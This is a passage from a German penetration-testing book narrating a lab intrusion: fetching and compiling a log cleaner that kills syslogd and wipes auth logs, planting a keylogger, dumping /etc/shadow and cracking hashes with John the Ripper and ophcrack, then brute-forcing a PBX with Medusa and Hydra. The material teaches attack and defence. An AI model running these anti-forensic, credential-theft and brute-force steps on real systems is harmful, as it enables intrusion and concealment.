s\u00e4mtliche Spuren des Einbruchs zu entfernen, greifen wir zu einem Logfile-Cleaner. Hierzu transferieren wir den Logfile-Cleaner der Wahl auf das kompromittierte System, entpacken den Tarball, kompilieren den Quelltext und starten mit ./0x333shadow -a -i das Entfernen unerw\u00fcnschter Spuren (alternativ zum Quelltext l\u00e4sst sich selbstredend auch eine vorkompilierte ELF-Datei247 \u00fcbertragen).\n247\nExecutable and Linking Format \u2013 http://cs.mipt.ru/docs/comp/eng/os/linux/howto/howto_english/elf/elfhowto-1.html\n516\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nsh-3.2# wget http://www.w00t.da.ru/0x333shadow.tar.gz --2010-02-15 23:48:49-- http://www.w00t.da.ru/0x333shadow.tar.gz Aufl\u00f6sen des Hostnamen \"www.w00t.da.ru\".... 213.172.16.20 Verbindungsaufbau zu www.w00t.da.ru|213.172.16.20|:80... verbunden. HTTP Anforderung gesendet, warte auf Antwort... 200 OK L\u00e4nge: 30208 (30K) [application/x-gzip] In \"0x333shadow.tar.gz\" speichern. 100%[====================================================================== ================>] 30.208 36,6K/s in 0,8s 2010-02-15 23:48:50 (36,6 KB/s) \u2013 \"0x333shadow.tar.gz\" gespeichert [30208/30208] sh-3.2# tar xfz 0x333shadow.tar.gz sh-3.2# cd 0x333shadow sh-3.2# ls -l insgesamt 32 -rw-r--r-- 1 root daemon 24725 5. Jun 2003 0x333shadow.c -rw-r--r-- 1 root daemon 2468 5. Jun 2003 README sh-3.2# gcc 0x333shadow.c -o 0x333shadow -D Linux 0x333shadow.c: In function \u2018usage\u2019: 0x333shadow.c:177: warning: incompatible implicit declaration of built-in function \u2018exit\u2019 0x333shadow.c: In function \u2018checkPromisc\u2019: 0x333shadow.c:325: warning: incompatible implicit declaration of built-in function \u2018realloc\u2019 0x333shadow.c: In function \u2018main\u2019: 0x333shadow.c:727: warning: incompatible implicit declaration of built-in function \u2018exit\u2019 sh-3.2# ./0x333shadow [~] 0x333shadow => hide your tracks version 0.1 [~] coded by nsn of outsiders ~ 0x333 Security Labs www.0x333.org [~] Usage: ./0x333shadow [action] -i [string] -l [secs] -m [ dir1/file1 ] [ dir2/file2 ] [ ... ] where action have to be:\n18.9 Linux unter Kontrolle: Spuren verwischen mit Logfile-Cleaner\n-a\n517\nclean all default dirs (recursive scan) you can use even -\nm. (include option -s, -b). -b clean only binary (utmp, wtmp, utmpx, wtmpx, lastlog) files.\nother options: -l clean after n secs, any system can log to logout, so you exit, and it try will clean (bg mode). -m specify more dirs or text files (if you don't specify -a, b, -s, default dirs and logs will be skipped ... so only dirs/files specified will be cleaned). -i string by search, choose it with sense ;) -s enable research other logs watching in syslogd newsyslog confs. -h show this help. other auto actions: read the DOCUMENTATION. this tool watch in these directory by default: /var/log /var/adm /usr/adm /var/mail correct use various example: ./0x333shadow -a -i string ./0x333shadow -b -i string -s ./0x333shadow -b -i string ./0x333shadow -a -i string -l 60 ./0x333shadow -i string -m /var/log/messages sh-3.2# ./0x333shadow -a -i amueller [*] trying another way for getting pid's syslogd (wasn't killed). [*] [*] [*] [*] [*] [*] [*] [*]\nsyslogd killed! Cleaning /var/log/kern.log removed 0/623 Cleaning /var/log/proftpd/xferlog removed 0/0 Cleaning /var/log/proftpd/proftpd.log removed 0/3 Cleaning /var/log/proftpd/controls.log removed 0/0 Cleaning /var/log/installer/lsb-release removed 0/0 Cleaning /var/log/installer/cdebconf/templates.dat removed 0/0 Cleaning /var/log/installer/cdebconf/questions.dat removed 0/0\n518\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\n[*] Cleaning /var/log/installer/partman removed 0/0 [*] Cleaning /var/log/installer/syslog removed 0/0 [*] Cleaning /var/log/installer/status removed 0/0 [*] Cleaning /var/log/installer/hardware-summary removed 0/0 [*] Cleaning /var/log/aptitude removed 0/0 [*] Cleaning /var/log/dmesg removed 0/615 [*] Cleaning /var/log/btmp removed 0/0 [*] Cleaning /var/log/daemon.log removed 0/2 [*] Cleaning /var/log/mail.warn removed 0/0 [*] Cleaning /var/log/dmesg.0 removed 0/0 [*] Cleaning /var/log/messages removed 0/461 [*] Cleaning /var/log/dmesg.2.gz removed 0/0 [*] Cleaning /var/log/mail.err removed 0/0 [*] Cleaning /var/log/exim4/mainlog removed 0/7 [*] Cleaning /var/log/dmesg.3.gz removed 0/0 [*] Cleaning /var/log/lpr.log removed 0/0 [*] Cleaning /var/log/news/news.notice removed 0/0 [*] Cleaning /var/log/news/news.crit removed 0/0 [*] Cleaning /var/log/news/news.err removed 0/0 [*] Cleaning /var/log/debug removed 0/161 [*] Cleaning /var/log/mail.log removed 0/0 [*] Cleaning /var/log/apt/term.log removed 0/0 [*] Cleaning /var/log/user.log removed 0/1 [*] Cleaning /var/log/faillog removed 0/0 [*] Cleaning /var/log/dpkg.log removed 0/0 [*] Cleaning /var/log/fsck/checkroot removed 0/8 [*] Cleaning /var/log/fsck/checkfs removed 0/7 [*] Cleaning /var/log/syslog removed 0/633 [*] Cleaning /var/log/auth.log removed 10/34 (...) [*] trying... restarting syslogd [*] syslogd \"/usr/sbin/rsyslogd -c3 \" restarted [*] acct not detected. [*] snoopy not detected. [*] checking interfaces in promisc mode... [*] founded 2 interfaces on this system. [*] interface: lo status: is in quiet mode. [*] interface: eth0 status: is in quiet mode. clean completed, 0x333 Security Labs www.0x333.org nsn of outsiders.\nDer hier vorgestellte Logfile-Cleaner k\u00fcmmert sich nicht nur um textbasierte Logs (wie beispielsweise der Datei /var/log/auth), sondern auch um bin\u00e4re Protokollstapel, die sich nicht mit einem Texteditor bearbeiten lie\u00dfen. Zudem ist durch einen leistungsf\u00e4higen\n18.10 Linux unter Kontrolle: Keylogger\n519\nLogfile-Cleaner sichergestellt, dass alle Logfiles des Systems frisiert werden (es wird somit in der Hektik nichts vergessen), und das in einem affenartigen Tempo. Die Kontrolle belegt, dass die Eintr\u00e4ge, von denen wir gar nicht begeistert w\u00e4ren, somit der Vergangenheit angeh\u00f6ren: Die Logfiles sind mittlerweile wieder porentief rein: sh-3.2# tail -n 10 /var/log/auth.log Feb 15 22:42:30 ftpserver sshd[2615]: opened for user mschmidt by (uid=0) Feb 15 22:49:31 ftpserver sshd[2615]: closed for user mschmidt Feb 15 22:56:44 ftpserver sshd[2714]: opened for user hlanger by (uid=0) Feb 15 22:57:46 ftpserver sshd[2714]: closed for user hlanger Feb 15 22:58:04 ftpserver sshd[2738]: 192.168.1.210 port 2232 ssh2 Feb 15 23:17:01 ftpserver CRON[2744]: opened for user root by (uid=0) Feb 15 23:17:01 ftpserver CRON[2744]: closed for user root Feb 15 23:43:43 ftpserver sshd[2758]: 192.168.1.28 port 2401 ssh2 Feb 15 23:43:43 ftpserver sshd[2758]: opened for user tkartes by (uid=0) sh-3.2#\npam_unix(sshd:session): session pam_unix(sshd:session): session pam_unix(sshd:session): session pam_unix(sshd:session): session Failed password for root from pam_unix(cron:session): session pam_unix(cron:session): session Accepted password for tkartes from pam_unix(sshd:session): session\nEin gut gemeinter Hinweis am Rande: Spielt der kompromittierte Rechner die Logfiles auf einen dedizierten Loghost, liegen die Protokolldaten somit nicht mehr ausschlie\u00dflich auf einem von uns greifbaren PC, sondern zus\u00e4tzlich noch auf einem anderen Rechner. In dem Fall muss der Eindringling versuchen, auch noch den Loghost zu kompromittieren, schnell das Weite suchen oder aber darauf hoffen, dass die Protokolle des Loghosts nie gesichtet werden.\n18.10 Linux unter Kontrolle: Keylogger Ein Keylogger ist ein Programm, das Eingaben des Benutzers protokolliert. Jedes Zeichen, das \u00fcber die Tastatur eingegeben wird, landet unbemerkt in einem Logfile und wartet darauf, ausgewertet zu werden.\n520\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nDie Vorbereitung des im Folgenden vorzustellenden logkeys248 gestaltet sich auf unserem Rechner wie folgt: root@discordia:/home/logkeys# tar xzf logkeys-0.1.0.tar.gz root@discordia:/home/logkeys# cd logkeys-0.1.0 root@discordia:/home/logkeys/logkeys-0.1.0# cd build/ root@discordia:/home/logkeys/logkeys-0.1.0/build# ../configure root@discordia:/home/logkeys/logkeys-0.1.0/build# make root@discordia:/home/logkeys/logkeys-0.1.0# cd src/ root@discordia:/home/logkeys/logkeys-0.1.0/build/src# ls -l total 72 -rw-r--r-- 1 root root 14189 Mar 10 13:30 Makefile -rwxr-xr-x 1 root root 29455 Mar 10 13:30 logkeys -rw-r--r-- 1 root root 21580 Mar 10 13:30 logkeys.o root@discordia:/home/logkeys/logkeys-0.1.0/build/src#\nNachdem der Quelltext in kompilierter Form vorliegt, reicht es aus, die ELF-Datei logkeys aus dem Verzeichnis logkeys-0.1.0/build/src auf dem Fremdsystem abzusetzen, durch ein chmod 755 logkeys mit passenden Rechten auszustatten und durch ./logkeys -s o=OUTPUTFILE zu starten: sh-3.2# ./logkeys --start --output logkeys.log sh-3.2#\nDa wir nicht unbedingt auf Login-Daten angewiesen sind (immerhin haben wir RootRechte auf dem System, ohne jedoch das Root-Passwort zu kennen), betrachten wir den Einsatz des Keyloggers als weitere Etappe auf dem Weg zur vollst\u00e4ndigen Infiltration des Netzwerks. Je mehr Login-Namen und Kennw\u00f6rter in unseren Besitz gelangen, desto besser steht es mit unserem Ziel der Eroberung weiterer Server. Immerhin zeigen viele Menschen erschreckend wenig Kreativit\u00e4t bei der Wahl ihrer Kennw\u00f6rter \u2013 eine Wiederverwendung des Kennworts in leicht abgewandelter Form geh\u00f6rt dabei noch zu den harmloseren Sicherheitsverst\u00f6\u00dfen. Die Wahrscheinlichkeit, auf diese Weise verwertbare Login-Daten f\u00fcr ein anderes System zu erhaschen, liegt somit im Bereich des M\u00f6glichen. Bevor wir m\u00f6glicherweise falsche Hoffnung wecken, erfolgt der Hinweis, dass viele Linux-Server als virtuelle Instanz oder \u00bbkopflos\u00ab und somit ohne Tastatur und Monitor betrieben werden \u2013 diese Kandidaten bieten Keyloggern nat\u00fcrlich keinerlei N\u00e4hrboden. Der Einsatz eines Keyloggers als flankierendem Baustein zur digitalen \u00bbVerminung\u00ab kann jedoch nur vorteilhaft sein.\n248\nhttp://code.google.com/p/logkeys\n18.11 Linux unter Kontrolle: Password-Cracking\n521\nMit etwas Gl\u00fcck ergattern wir Login-Daten, so etwa im folgenden Beispiel: sh-3.2# cat logkeys.log Logging started ... 2010-03-10 2010-03-10 2010-03-10 2010-03-10 2010-03-10 2010-03-10 (...) 2010-03-10 2010-03-10 sh-3.2#\n19:35:18+0000 19:35:35+0000 19:46:46+0000 19:46:55+0000 19:47:22+0000 19:47:29+0000\n> > > > > >\nuname -a ps -aux useradd -m hweber passwd hweber maxtor19! maxtor19!\n19:47:47+0000 > aptitude update 19:48:05+0000 > exit\nDas Kennwort des neu angelegten Users hweber lautet \u00bbmaxtor19!\u00ab, wie einfallslos! Wir sollten zu einem sp\u00e4teren Zeitpunkt versuchen, ob sich diese Daten auch auf einem anderen Rechner verwenden lassen (zumindest erscheint es sinnvoll, sowohl den Benutzernamen als auch das Kennwort in die Datenbank eines sp\u00e4ter vorzustellenden LoginBrute-Force-Crackers zu integrieren).\n18.11 Linux unter Kontrolle: Password-Cracking Fast jeder Rechner liefert einem Angreifer vielf\u00e4ltige Informationen, die als Munition f\u00fcr weitere Eroberungen eingesetzt werden k\u00f6nnen. In diesem Fall widmen wir uns einer menschlichen Unsitte: der Wiederverwendung von Passw\u00f6rtern. Vielen Menschen bereitet es erhebliche Schwierigkeiten, sich f\u00fcr jede Anwendung und jeden Server ein komplexes, unverbrauchtes Kennwort auszudenken und zu merken. Sie entscheiden sich somit oftmals f\u00fcr den einfachen Weg: die Wahl trivialer Kennw\u00f6rter oder die Wiederverwendung von Kennw\u00f6rtern \u2013 im schlimmsten Fall sogar eine Kombination aus beidem, was eine gef\u00e4hrliche Mischung ergibt. Unter Interesse gilt der Datei /etc/shadow), die s\u00e4mtliche Daten zur Benutzerverwaltung beinhaltet, Login-Namen und Kennwortdaten inklusive. Der Inhalt der Datei lautet wie folgt: sh-3.2# cat /etc/shadow root:$1$LVNuaIV.$QsdMRU1efQ7i3PWBseb.40:14677:0:99999:7::: daemon:*:14647:0:99999:7::: bin:*:14647:0:99999:7::: sys:*:14647:0:99999:7::: (...) statd:*:14647:0:99999:7::: mschmidt:$1$yqIcU3fP$Xt/WWlRQM2reVHCzF/L1.0:14677:0:99999:7:::\n522\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nsshd:*:14647:0:99999:7::: amueller:$1$ISlbRJJA$qcR0G8ttb.owL2Gu94ICP0:14647:0:99999:7::: mmueller:$1$ZCibHAKH$mHrUmar2ThCKwERfLYZqV0:14677:0:99999:7::: hlanger:$1$ynW.6laU$H2F5uYXX7KWkh3U/o1g.6/:14677:0:99999:7::: ogehrling:$1$I2QKvNB3$mShBOmF.RRvnaeCV7BDMq0:14677:0:99999:7::: tkartes:$1$7.Hu9Hjp$AlI/YrK0nCwpCu4NS44jq/:14677:0:99999:7::: proftpd:!:14647:0:99999:7::: ftp:*:14647:0:99999:7::: sh-3.2#\nDie Liste zeigt leider einen Makel: Die Kennw\u00f6rter sind verschl\u00fcsselt abgelegt, zum jetzigen Zeitpunkt f\u00fcr uns somit wertlos. Kurzum: Wir m\u00fcssen einen Weg finden, die Kennw\u00f6rter in die urspr\u00fcngliche Form zur\u00fcckzubringen, andernfalls kommen wir an dieser Stelle nicht weiter. Eine Errechnung der verschl\u00fcsselten Kennw\u00f6rter scheidet im \u00dcbrigen aus, da es sich bei vorliegender Datei um eine Einwegverschl\u00fcsselung handelt. Was jedoch funktioniert, ist die Verschl\u00fcsselung eines Textstrings und der darauffolgende Vergleich des verschl\u00fcsselten Textstrings mit dem verschl\u00fcsselt abgelegten Kennwort. Gibt es eine \u00dcbereinstimmung, wurde das Kennwort gefunden.\n18.11.1 John the Ripper F\u00fcr diese Aufgabe ziehen wir das weit verbreitete Programm John the Ripper249 zum Knacken von Passw\u00f6rtern heran, der verschl\u00fcsselt abgelegte Passw\u00f6rter mit W\u00f6rterbuchattacken oder durch intelligentes Brute-Force knackt. Password-Cracker k\u00f6nnen auf modernen PCs einige hunderttausend Passw\u00f6rter pro Sekunde ausprobieren, jeweils in Abh\u00e4ngigkeit der zur Verf\u00fcgung stehenden Rechenzeit. Die Rechenzeit ist in den meisten F\u00e4llen der limitierende Faktor. Wer m\u00f6chte schon gerne seine Rechner andauernd unter Volllast laufen lassen, sodass kaum Ressourcen f\u00fcr andere T\u00e4tigkeiten \u00fcbrig bleiben? Doch wir befinden uns schlie\u00dflich auf einem Server, den wir mit einer sinnvollen Aufgabe betreuen wollen, da kommt diese Herausforderung gerade recht. Die Berechnung der Kennwortdatei wird im einfachsten Fall mit der Eingabe von john initiiert: sh-3.2# ./john ftpserver_shadow Loaded 7 password hashes with 7 different salts (FreeBSD MD5 [32/32]) hlanger8 (hlanger) sunshine (ogehrling) enigma (mmueller) guesses: 3 time: 3:01:13:10 (3) c/s: 7329 trying: pkg6c3 Session aborted sh-3.2#\n249\nhttp://www.openwall.com/john/\n18.11 Linux unter Kontrolle: Password-Cracking\n523\nDie ersten beiden Kennw\u00f6rter purzeln bereits nach wenigen Minuten heraus, nach drei Tagen sind immerhin 3 von 7 verwertbaren Kennw\u00f6rtern errechnet \u2013 genug Material f\u00fcr die Kontaktaufnahme mit weiteren Servern im Netzwerk, die sich im ersten Schritt als nicht auff\u00e4llig f\u00fcr technische Sicherheitsl\u00fccken erwiesen haben. Zeigen wir Interesse an weiteren Kennw\u00f6rtern, fahren wir mit dem Password-Cracker einfach fort \u2013 so lange, bis das letzte Kennwort errechnet ist.\n18.11.2 ophcrack Wie bereits beim Einsatz des externen Meterpreter-Skripts WinEnum demonstriert, befinden wir uns mittlerweile im Besitz der SAM-Hashwerte zahlreicher Windows-PCs, unter anderem des Windows Servers 2003 f\u00fcr das Intranet (vgl. hashdump.txt). Zwar ist auch John the Ripper in der Lage, LM- und NTLM-Hashes zu brechen, wir m\u00f6chten im Folgenden jedoch einen alternativen, auf Rainbow Tables basierenden PasswordCracker namens ophcrack250 vorstellen. Bei Rainbow Tables handelt es sich um eine kompakte Repr\u00e4sentation von zusammenh\u00e4ngenden Passwortsequenzen, sogenannten Ketten (chains), die eine z\u00fcgige, probabilistische Suche nach dem einem Hash-Wert zugeordneten Klartext erm\u00f6glicht (in unserem Szenario ein Passwort). Zum Finden eines Schl\u00fcssels muss ein Angreifer mehrere Abschnitte einer Kette wiederherstellen. Jede dieser Ketten startet mit einem einleitenden Kennwort, welches durch eine Hash-Funktion geleitet wird. Der daraus entspringende Hash wird abermals durch eine Reduktionsfunktion geleitet mit dem Ergebnis, ein weiteres potenzielles Klartextkennwort zu gewinnen. Der gesamte Prozess wird f\u00fcr eine festgelegte Serie wiederholt und schlie\u00dflich das erste Kennwort der Kette zusammen mit dem letzten Hashwert gespeichert. Rainbow Tables stellen eine effizientere Methode f\u00fcr n-stellige Zeichenketten dar, denn statistisch wird durchschnittlich die H\u00e4lfte der Schl\u00fcssel gefunden, sobald die halbe Kettenl\u00e4nge erreicht ist. Im Gegensatz dazu werden bei einem Brute-ForceAngriff viele Zeichenketten in Hashes umgewandelt, die mit hoher Wahrscheinlichkeit niemals fallen werden und somit unn\u00f6tig viel Zeit und Rechenpower verschwenden. W\u00e4hrend die Windows-Version von ophcrack direkt auf die jeweilige SAM-Datenbank zugreift und beispielsweise einen User-Dump mitsamt der Passwort-Hashes generieren kann \u2013 administrative Rechte vorausgesetzt \u2013, ben\u00f6tigen wir f\u00fcr die Linux-Version einen vorab erzeugten Dump.\n250\nhttp://ophcrack.sourceforge.net\n524\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nUnser durch WinEnum gewonnener Hashdump wird durch das Kommando ophcrack -g -d -t -f in ophcrack eingebunden wie folgt: root@discordia:/home/ophcrack# ophcrack -g -d /home/ophcrack/ -t /home/ophcrack/tables_xp_free_fast/ -f /home/ophcrack/hashdump_intranet.dump 20 hashes have been found in /home/ophcrack/hashdump_intranet.dump. Opened 4 table(s) from /home/ophcrack/tables_xp_free_fast/. 0h 0m 0s; Found empty password for 2nd LM hash #1 0h 0m 0s; Found empty password for user Guest (NT hash #4) 0h 0m 1s; Found password ER! for 2nd LM hash #3 0h 0m 14s; Found password RRIS for 2nd LM hash #0 0h 2m 19s; Found password CHUCKNO for 1st LM hash #0in table XP free fast #0 at column 4768. 0h 2m 19s; Found password chucknorris for user Administrator (NT hash #0) 0h 3m 39s; Found password YAHNFEE for 1st LM hash #1in table XP free fast #0 at column 2348. 0h 3m 39s; Found password yahnfee for user Administrator-backup? (NT hash #1) 0h 7m 56s; Found password DEVELO8 for 1st LM hash #3in table XP free fast #2 at column 4727. 0h 7m 56s; Found password develo8er! for user Developer (NT hash #3) 0h 10m 34s; search (100%); tables: total 4, done 2, using 2; pwd found 4/8. Results: username / hash Administrator Administrator-backup? ASPNET Developer Guest IUSR_0WQVBJQ3T32MEG8? IWAM_0WQVBJQ3T32MEG8 SUPPORT_388945a0?\nLM password CHUCKNORRIS YAHNFEE .............. DEVELO8ER! *** empty *** .............. .............. *** empty ***\nNT password chucknorris yahnfee ....... develo8er! *** empty *** ....... ....... .......\nroot@discordia:/home/ophcrack#\nBinnen zehn Minuten erfolgte die Berechnung s\u00e4mtlicher Windows-Kennw\u00f6rter, was die Frage nach dem Potenzial von Rainbow Tables restlos kl\u00e4ren d\u00fcrfte. Hier ein zus\u00e4tzlicher Hinweis darauf, dass die Geschwindigkeit von ophcrack in Verbindung mit einer gro\u00dfen, beispielsweise 90 GB umfassenden Rainbow Table durch den Einsatz einer Solid State Drive (SSD)251 um den Faktor 100 gesteigert werden kann (die Website252 der 251\nhttp://www.objectif-securite.ch/en/news.php\n252\nhttp://www.objectif-securite.ch/en/products.php\n18.11 Linux unter Kontrolle: Password-Cracking\n525\nophcrack-Entwickler, die unter \u00bbXP Special Demo\u00ab bereitwillig Hashes entgegennimmt, liefert zumindest ein bemerkenswertes Ergebnis).\nBild 18.21: ophcrack beim Errechnen des administrativen Kennworts \u2013 3... 2... 1... meins!\nNicht unerw\u00e4hnt lassen m\u00f6chten die Autoren an dieser Stelle, dass selbstverst\u00e4ndlich auch die \u00bbklassischen\u00ab Password-Cracker von der hochgez\u00fcchteten Rechenleistung moderner Grafikprozessoren profitieren. Moderne Cracker wie BarsWF253 f\u00fcr MD5Hashes oder der kommerzielle Distributed Password Recovery von Firma Elcomsoft254 verteilen die Rechenlast auf nahezu beliebig viele Prozessorkerne und sorgen so auf Gro\u00dfrechnerverb\u00fcnden f\u00fcr einen m\u00e4chtigen Geschwindigkeitsschub. So betr\u00e4gt beispielsweise die maximale Crack-Dauer f\u00fcr ein 8-stelliges Windows-Passwort (NTLM), bestehend aus einer Kombination von Gro\u00dfbuchstaben, Kleinbuchstaben, Zahlen und typischen Sonderzeichen auf einem AMD Athlon X2 4850e mit zwei GeForce-9800-GTX-Karten nur noch 33 Tage. Es ist somit h\u00f6chste Zeit, die PasswordPolicies dem aktuellen Stand der Technik anzupassen!\n18.11.3 Medusa Wie bereits im Kapitel \u00bbTools\u00ab erl\u00e4utert, lassen sich dem Network-Logon-Cracker Medusa eine Reihe von Diensten aus der Ferne gegen schwache Passw\u00f6rter testen. Beim Scanning mit Nmap ist uns eine Telefonanlage von Panasonic mit der IP-Adresse 192.168.1.5 aufgefallen, die sich beim jetzigen Versuch als Proband bet\u00e4tigen darf, und wir konzentrieren uns dabei auf den Telnet-Dienst. Hierzu intendieren wir Medusa durch \u2013h auf das Ziel, definieren mit \u2013u den Standarduser255 f\u00fcr Telefonanlagen von Panasonic, verweisen mit \u2013P auf eine f\u00fcr die Telefonie optimierte Wordlist und bestimmen mit \u2013M das Modul in Form von Telnet:\n253\nhttp://3.14.by/en/md5\n254\nhttp://www.elcomsoft.com\n255\nhttp://artofhacking.com/etc/passwd-panasonic.htm\n526\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nroot@discordia:~# medusa -h 192.168.1.5 -u admin -P /home/medusa/wordlist_telco.txt -M telnet Medusa v1.5 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks ERROR: [telnet.mod] Failed to identify logon prompt. ACCOUNT CHECK: [telnet] Host: 192.168.168.9 (1 of 1, 1 complete) User: admin (1 of 1, 1 complete) Password: pbx (1 of 25226 complete) root@discordia:~#\nDas war nicht mehr als eine kurze Spritztour. Medusa gibt uns klar zu verstehen, dass der Telnet-Dienst nicht identifiziert werden kann. Unsere manuelle Sichtung best\u00e4tigt den Verdacht, dass es sich beim Telnet-Prompt um einen Exoten zu handeln scheint, f\u00fcr den Medusa kein passendes Modul mitbringt. Ein gew\u00f6hnlicher Telnet-Prompt bei Unix-Varianten sieht zumindest anders aus: root@discordia:~# telnet 192.168.1.5 Trying 192.168.1.5... Connected to 192.168.1.5. Escape character is '^]'. Welcome to KX-TD1232 Panasonic Operating Company login:\nEine M\u00f6glichkeit besteht nun in der Programmierung eines geeigneten, m\u00f6glicherweise leicht abgewandelten Moduls, eine andere in der Penetration des FTP-Dienstes. Wie bereits am Linux-Server verdeutlicht, greifen FTP, SSH und Telnet oftmals auf die gleiche Kontenbasis zur\u00fcck was bedeutet, dass sich ein Login samt Kennwort f\u00fcr verschiedene Dienste nutzen l\u00e4sst. Wir versuchen unser Gl\u00fcck, konzentrieren uns jedoch diesmal durch den Parameter \u2013M ftp auf den FTP-Dienst: root@discordia:~# medusa -h 192.168.1.5 -u admin -P /home/medusa/wordlist_telco.txt -M ftp Medusa v1.5 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks ACCOUNT CHECK: [ftp] (1 of 1, 1 complete) ACCOUNT CHECK: [ftp] (1 of 1, 1 complete) ACCOUNT CHECK: [ftp] (1 of 1, 1 complete) ACCOUNT CHECK: [ftp] (1 of 1, 1 complete)\nHost: 192.168.168.9 (1 of 1, 1 complete) User: Password: pbx (1 of 25226 complete) Host: 192.168.168.9 (1 of 1, 1 complete) User: Password: admin (2 of 25226 complete) Host: 192.168.168.9 (1 of 1, 1 complete) User: Password: telephone (3 of 25226 complete) Host: 192.168.168.9 (1 of 1, 1 complete) User: Password: root (4 of 25226 complete)\nadmin admin admin admin\n18.11 Linux unter Kontrolle: Password-Cracking\n527\nACCOUNT CHECK: [ftp] Host: 192.168.168.9 (1 of 1, 1 complete) User: admin (1 of 1, 1 complete) Password: password (5 of 25226 complete) NOTICE: [ftp.mod] Socket is no longer valid. Server likely dropped connection. Establishing new session. ACCOUNT CHECK: [ftp] Host: 192.168.168.9 (1 of 1, 1 complete) User: (1 of 1, 1 complete) Password: siemens (6 of 25226 complete) ACCOUNT CHECK: [ftp] Host: 192.168.168.9 (1 of 1, 1 complete) User: (1 of 1, 1 complete) Password: hipath (7 of 25226 complete) ACCOUNT CHECK: [ftp] Host: 192.168.168.9 (1 of 1, 1 complete) User: (1 of 1, 1 complete) Password: asc (8 of 25226 complete) ACCOUNT CHECK: [ftp] Host: 192.168.168.9 (1 of 1, 1 complete) User: (1 of 1, 1 complete) Password: rinring (9 of 25226 complete) ACCOUNT CHECK: [ftp] Host: 192.168.168.9 (1 of 1, 1 complete) User: (1 of 1, 1 complete) Password: telefon (10 of 25226 complete) ERROR: [ftp.mod] failed: Server did not respond with a '331'. CRITICAL: Unknown ftp.mod module state -1 root@discordia:~#\nadmin admin admin admin admin\nDer FTP-Dienst der TK-Anlage wird seitens Medusa zwar korrekt erkannt, der LoginPrompt scheint unseren Anfragen jedoch nicht gewachsen zu sein und l\u00e4uft auf einen Fehler. Greifen wir somit zu Parametern, mit denen Threats, Timing und die Zahl der parallel zu testenden Logins relativiert werden k\u00f6nnen. So zumindest die Hoffnung. Um die folgenden vergeblichen Versuche des Zusammenspiels nicht weiter vertiefen zu m\u00fcssen, erfolgt der abschlie\u00dfende Hinweis darauf, dass sich selbst mit angezogener Handbremse \u2013 in Form einer Erweiterung durch -r 9 -t 1 (\u00bbmedusa -h 192.168.1.5 -u admin -P /home/medusa/wordlist_telco.txt -r 9 -f -t 1 -M ftp -v 6\u00ab) \u2013 kein Erfolg einstellte, sodass wir nun mit einem alternativen Tool fortfahren. Schade eigentlich.\n18.11.4 Hydra Beim Network-Logon-Cracker Hydra handelt es sich um einen echten Klassiker, der damit gl\u00e4nzt, durch einen W\u00f6rterbuchangriff die Passw\u00f6rter von vielen Protokollen und Anwendungen entschl\u00fcsseln zu k\u00f6nnen. Obwohl es die letzten Jahre recht still um Hydra war, geh\u00f6rt der Network-Logon-Cracker noch lange nicht zum alten Eisen. Auf unsere Telefonanlage losgelassen, erhalten wir folgende R\u00fcckmeldung: root@discordia:~# hydra -l admin -P /home/hydra/wordlist_telco.txt -w 60 -t 1 -V 192.168.1.5 ftp Hydra v5.4 (c) 2006 by van Hauser / THC \u2013 use allowed only for legal purposes. Hydra (http://www.thc.org) starting at 2010-02-09 02:09:41 [DATA] 1 tasks, 1 servers, 25226 login tries (l:1/p:25226), ~25226 tries per task [DATA] attacking service ftp on port 21\n528\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\n[ATTEMPT] target 192.168.1.5 \u2013 login \"admin\" \u2013 pass \"pbx\" \u2013 child 0 \u2013 1 of 25226 [ATTEMPT] target 192.168.1.5 \u2013 login \"admin\" \u2013 pass \"admin\" \u2013 child 0 \u2013 2 of 25226 [ATTEMPT] target 192.168.1.5 \u2013 login \"admin\" \u2013 pass \"root\" \u2013 child 0 \u2013 3 of 25226 [ATTEMPT] target 192.168.1.5 \u2013 login \"admin\" \u2013 pass \"password\" \u2013 child 0 \u2013 4 of 25226 (...) [ATTEMPT] target 192.168.1.5 \u2013 login \"admin\" \u2013 pass \"NULL\" \u2013 child 0 \u2013 7667 of 25226 [ATTEMPT] target 192.168.1.5 \u2013 login \"admin\" \u2013 pass \"changeme\" \u2013 child 0 \u2013 7668 of 25226 [ATTEMPT] target 192.168.1.5 \u2013 login \"admin\" \u2013 pass \"changeme2\" \u2013 child 0 \u2013 7669 of 25226 [ATTEMPT] target 192.168.1.5 \u2013 login \"admin\" \u2013 pass \"telefonmann\" \u2013 child 0 \u2013 7670 of 25226 [21][ftp] host: 192.168.1.5 login: admin password: telefonmann [STATUS] attack finished for 192.168.1.5 (waiting for childs to finish) Hydra (http://www.thc.org) finished at 2010-02-09 07:12:54 root@discordia:~#\nHydra vermag uns in diesem Szenario das Kennwort zu liefern, an dem sich Medusa \u2013 der f\u00fcr gew\u00f6hnlich brillante Ergebnisse liefert \u2013 die Z\u00e4hne ausgebissen hat. Der erste Login durch Telnet mit den erbeuteten Zugangsdaten in die Telefonanlage gestaltet sich wie folgt: root@discordia:~# telnet 192.168.1.5 Trying 192.168.1.5... Connected to 192.168.1.5. Escape character is '^]'. Welcome to KX-TD1232 Panasonic Operating Company login: admin Password: telefonmann Last login: Tue Feb 2 16:33:20 from 192.168.1.241 KX-TD1232 Enterprise standard installation last performed: 11-Jun-2008 09:12:34\n18.11 Linux unter Kontrolle: Password-Cracking\n#\n529\nThe role of the CPU is MAIN\nApplication software identity Release5.8.4-a3.5145-19-de-ger-e87 Business identification: Release5.8.4 Release: DELIVERY ger4.316 Patch identification: 21 Dynamic patch identification: axa Country: ger Cpu: a8 ACD VERSION release : 5 bug_fixing : 2 protocol_id : 91 version_dy_hr_stat :\n13\n-> Wrong CPU-Id (1)xa000000> cat /etc/passwd root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/bin/false daemon:x:2:2:daemon:/sbin:/bin/false ftp:x:14:50:FTP User:/var/ftp:/bin/false 